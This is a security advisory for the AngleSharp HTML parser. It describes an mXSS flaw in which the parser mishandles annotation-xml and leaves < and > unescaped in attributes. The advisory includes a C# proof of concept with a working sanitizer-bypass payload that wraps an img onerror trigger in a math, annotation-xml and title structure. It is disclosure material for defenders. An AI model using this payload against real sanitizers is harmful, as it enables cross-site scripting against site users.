# [M] AngleSharp HTML5 Spec Compliance: mXSS via annotation-xml HTML Integration Point Bypass

## Summary
Severity: Medium
Advisory: GHSA-pgww-w46g-26qg
CVE: CVE-2026-54570
CWE: CWE-80
Ecosystem: NuGet
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:N (CVSS_V3)
Published: 2026-07-17
Source: https://github.com/advisories/GHSA-pgww-w46g-26qg
Type: github-advisory

## Affected
- NuGet: `AngleSharp` — affected >=0 <1.5.0

## Details
### Summary
The HTML specification requires that a MathML `<annotation-xml>` element with `encoding="text/html"` or `encoding="application/xhtml+xml"` is treated as an HTML integration point. Content inside it must be parsed as HTML, not MathML.

AngleSharp does not implement this correctly. As a result, the parser produces a DOM tree that differs from what a browser will build (different namespaces if `encoding="text/html"` is not treated) when given the same serialized output. Two bugs combine to make this exploitable:

- Missing HtmlTip flag: MathAnnotationXmlElement is never assigned NodeFlags.HtmlTip based on its encoding attribute, so the Consume() dispatch always routes tokens to Foreign() instead of Home() (HTML mode).
- Unescaped < > in attribute values: HtmlMarkupFormatter.WriteAttributeValue() does not escape < or > characters, only & and ". This allows injected markup to break out of attribute values on re-parse. _See [Escape "<" and ">" in attributes when serializing HTML #6235
](https://github.com/whatwg/html/issues/6235)_


### Details
In `MathAnnotationXmlElement` (`AngleSharp/Mathml/Dom/Internal/MathAnnotationXmlElement.cs`):
```cs
// Current — HtmlTip is never set
: base(owner, TagNames.AnnotationXml, prefix, NodeFlags.Special | NodeFlags.Scoped)
```

Because `HtmlTip` is absent, the token dispatch in `Consume()` always sends tokens to `Foreign()` when inside `annotation-xml`, regardless of the encoding attribute. The compensating check in `ForeignNormalTag()` only covers tags in `AllForeignExceptions` and is entirely bypassed during fragment parsing (`innerHTML` setter) due to an `if (!IsFragmentCase)` guard.

In `HtmlMarkupFormatter.WriteAttributeValue()` (`AngleSharp/Html/HtmlMarkupFormatter.cs`):
```cs
// Escapes & " and \u00A0, but NOT < or >
case Symbols.Ampersand:    stringBuilder.Append("&amp;");  break;
case Symbols.NoBreakSpace: stringBuilder.Append("&nbsp;"); break;
case Symbols.DoubleQuote:  stringBuilder.Append("&quot;"); break;
default:                   stringBuilder.Append(value[i]); break; // < and > pass through raw
```

### PoC
The following program demonstrates that AngleSharp’s parser misses the injected `<img>` element. A sanitizer walking this DOM would see nothing dangerous, yet the serialized output re-parses in a browser as a live `<img onerror>` trigger.
```cs
using System;
using System.Linq;
using AngleSharp.Html.Parser;
			
public class Program
{
    static readonly string Payload1 =
        "<math>" +
        "<annotation-xml encoding=\"text/html\">" +
        "<title><a encoding=\"</title><img src=x onerror=alert()>\">" +
        "</annotation-xml></math>";

    public static void Main()
    {
        var parser = new HtmlParser();

        Check(parser, Payload1, "IMG",
            "AngleSharp missed <img> – VULNERABLE (mXSS via attribute serialization)",
            "AngleSharp found <img> – SAFE");
    }

    static void Check(HtmlParser parser, string html, string tag,
                      string failMsg, string passMsg)
    {
        var doc     = parser.ParseDocument(html);
        var tags    = doc.All.Select(e => e.TagName).ToHashSet();
        var found   = tags.Contains(tag);

        Console.WriteLine(found ? passMsg : failMsg);
        Console.WriteLine("Serialized output:");
        Console.WriteLine(doc.DocumentElement.OuterHtml);
    }
}
```

Output:
```
AngleSharp missed <img> – VULNERABLE (mXSS via attribute serialization)
Serialized output:
<html><head></head><body><math><annotation-xml encoding="text/html"><title><a encoding="</title><img src=x onerror=alert()>"></a></title></annotation-xml></math></body></html>
```

_The `title` tag may be swapped out for `style` and other RCDATA elements._

When a browser receives this string and parses `annotation-xml encoding="text/html"` as an HTML integration point, the `</title>` closes the title element and the `<img>` fires its onerror handler.

### Impact
Implemented HTML sanitizers that depend and trust AngleSharp's ability to parse HTML correctly may be bypassable, as AngleSharp fails to acknowledge certain vectors under certain conditions.

This reduces AngleSharp's credibility as a conformant HTML parser.

## References
- https://github.com/AngleSharp/AngleSharp/security/advisories/GHSA-pgww-w46g-26qg
- https://github.com/AngleSharp/AngleSharp
- https://github.com/AngleSharp/AngleSharp/releases/tag/1.5.0
